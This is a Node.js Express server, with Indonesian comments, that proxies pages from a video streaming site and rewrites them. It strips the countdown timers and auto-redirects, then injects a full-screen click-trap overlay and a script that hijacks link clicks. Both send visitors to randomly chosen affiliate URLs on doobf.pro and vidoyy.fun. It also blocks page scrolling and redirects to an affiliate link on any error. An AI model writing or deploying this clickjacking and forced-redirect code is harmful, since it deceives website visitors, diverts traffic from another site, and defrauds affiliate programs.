const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BASE_URL = 'https://vidstrm.cloud';
const AFFILIATE_LINKS = [
  'https://doobf.pro/8AQUp3ZesV',
  'https://doobf.pro/9pYio8K2cw',
  'https://doobf.pro/8pgBcJjIzl',
  'https://doobf.pro/60M0F7txlS',
  'https://vidoyy.fun/7VAo1N0hIp',
  'https://vidoyy.fun/9KcSCm0Xb7',
  'https://vidoyy.fun/3LLF3lT65E',
  'https://vidoyy.fun/6VIGpbCEoc'
];

app.use(async (req, res) => {
  try {
    const targetUrl = BASE_URL + req.originalUrl;
    
    const response = await fetch(targetUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    
    if (!response.ok) return res.redirect(targetUrl);
    
    let html = await response.text();
    
    // === HAPUS HANYA BAGIAN COUNTDOWN SAJA ===
    // Hapus script countdown, timer, setInterval, setTimeout yang berhubungan dengan angka
    
    // 1. Hapus element dengan class/id mengandung countdown/timer
    html = html.replace(/<[^>]*countdown[^>]*>.*?<\/[^>]*>/gi, '');
    html = html.replace(/<[^>]*timer[^>]*>.*?<\/[^>]*>/gi, '');
    
    // 2. Hapus script yang punya countdown logic
    html = html.replace(/let countdown\s*=\s*\d+/gi, 'let countdown = 0');
    html = html.replace(/var countdown\s*=\s*\d+/gi, 'var countdown = 0');
    html = html.replace(/countdown\s*=\s*\d+/gi, 'countdown = 0');
    
    // 3. Hapus interval untuk countdown
    html = html.replace(/setInterval\([^)]*countdown[^)]*\)/gi, '// countdown removed');
    html = html.replace(/setInterval\(function[^}]*countdown[^}]*}[^)]*\)/gi, '// countdown removed');
    
    // 4. Hapus semua setTimeout untuk redirect otomatis
    html = html.replace(/setTimeout\([^)]*redirect[^)]*\)/gi, '// auto redirect removed');
    html = html.replace(/setTimeout\([^)]*location[^)]*\)/gi, '// auto redirect removed');
    
    // 5. Hapus teks "detik", "seconds", etc
    html = html.replace(/\d+\s*(detik|seconds|second)/gi, '');
    
    // === TAMBAHKAN OVERLAY TANPA COUNTDOWN ===
    const overlayHTML = `<div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;color:white;display:flex;align-items:center;justify-content:center;font-family:Arial;cursor:pointer;" onclick="
      const links=${JSON.stringify(AFFILIATE_LINKS)};
      const url=links[Math.floor(Math.random()*links.length)];
      window.location.href=url;
      this.style.display='none';
      document.body.style.overflow='auto';
    ">
      <div style="background:#EE4D2D;padding:30px;border-radius:10px;text-align:center;">
        <div style="font-size:40px;">👉</div>
        <div style="font-size:20px;font-weight:bold;margin:15px 0;">KLIK UNTUK MELANJUTKAN</div>
        <div style="background:white;color:#EE4D2D;padding:10px 25px;border-radius:5px;display:inline-block;font-weight:bold;">KLIK DISINI</div>
      </div>
    </div>`;
    
    // === SCRIPT SEDERHANA TANPA COUNTDOWN ===
    const script = `<script>
      // Overlay sudah ada onclick di HTML
      
      // Untuk klik link setelah overlay hilang
      document.addEventListener('click', function(e) {
        if (document.getElementById('overlay').style.display === 'none') {
          const link = e.target.closest('a');
          if (link && link.href) {
            e.preventDefault();
            const links = ${JSON.stringify(AFFILIATE_LINKS)};
            const url = links[Math.floor(Math.random() * links.length)];
            window.open(url, '_blank');
            setTimeout(() => window.location.href = link.href, 300);
          }
        }
      });
    </script>`;
    
    // Inject overlay dan script
    html = html.replace('<body', overlayHTML + '<body');
    html = html.replace('</body>', script + '</body>');
    
    // Block scroll
    if (!html.includes('overflow:hidden')) {
      html = html.replace('<head>', '<head><style>body{overflow:hidden!important;height:100vh!important;}</style>');
    }
    
    // Fix links
    html = html.replace(/href="https:\/\/vidstrm\.cloud\//g, 'href="/');
    
    res.set('Content-Type', 'text/html').send(html);
    
  } catch (error) {
    console.error('Error:', error);
    const randomLink = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
    res.redirect(randomLink);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = app;
